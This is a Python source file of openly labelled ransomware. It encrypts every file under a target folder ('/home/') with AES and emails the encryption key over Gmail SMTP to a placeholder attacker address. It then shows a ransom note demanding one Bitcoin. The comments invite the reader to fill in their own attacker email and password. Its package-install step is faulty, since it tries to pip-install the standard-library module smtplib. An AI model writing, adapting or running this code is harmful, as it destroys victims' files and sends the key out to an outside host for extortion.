import os

import subprocess

import sys



# Check if required libraries are installed and install them if missing

def install_required_packages():

    try:

        import cryptography

        import smtplib

    except ImportError:

        print("Required packages not found, installing them...")

        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])

        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'smtplib'])



# Call the function to ensure required packages are installed

install_required_packages()



# After ensuring that packages are installed, import them

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from cryptography.hazmat.backends import default_backend

from cryptography.hazmat.primitives import padding

import smtplib

import tkinter as tk

from tkinter import messagebox



# Function to encrypt a file

def encrypt_file(file_path, key):

    backend = default_backend()

    iv = os.urandom(16)  # Initialization vector for AES



    # Read file data

    with open(file_path, 'rb') as f:

        file_data = f.read()



    # Padding the file data to match AES block size

    padder = padding.PKCS7(128).padder()

    padded_data = padder.update(file_data) + padder.finalize()



    # Encrypt file data using AES

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)

    encryptor = cipher.encryptor()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()



    # Write encrypted data back to the file

    with open(file_path, 'wb') as f:

        f.write(iv + encrypted_data)



# Function to send encryption key to attacker via email

def send_key_to_attacker(key):

    attacker_email = "attacker_email@gmail.com"  # Replace with your attacker email

    attacker_password = "password"  # Replace with your email password



    try:

        server = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server

        server.starttls()  # Secure the connection

        server.login(attacker_email, attacker_password)



        message = f'Subject: Encryption Key\n\nThe encryption key is: {key.hex()}'

        server.sendmail(attacker_email, attacker_email, message)

        server.quit()

        print("Encryption key sent successfully.")

    except Exception as e:

        print(f"Failed to send the email: {e}")



# Function to display ransom note pop-up

def show_ransom_note():

    root = tk.Tk()

    root.withdraw()  # Hide the root window

    messagebox.showwarning("Your Files Have Been Encrypted!",

                           "Your files have been encrypted. To decrypt them, send 1 BTC to [Bitcoin Address].")

    root.mainloop()



# Function to encrypt files in a specific folder

def encrypt_folder(folder_path):

    key = os.urandom(32)  # Generate a 256-bit AES key



    # Encrypt files in the specified folder

    for root, dirs, files in os.walk(folder_path):

        for file in files:

            try:

                file_path = os.path.join(root, file)

                encrypt_file(file_path, key)

                print(f"Encrypted: {file_path}")

            except Exception as e:

                print(f"Failed to encrypt {file_path}: {e}")



    # Send the encryption key to the attacker

    send_key_to_attacker(key)



    # Display the ransom note

    show_ransom_note()



# Define the folder you want to test on (manual input)

target_folder = "/home/"  # Replace with the folder path you want to encrypt



# Start ransomware attack on the specified folder

encrypt_folder(target_folder)
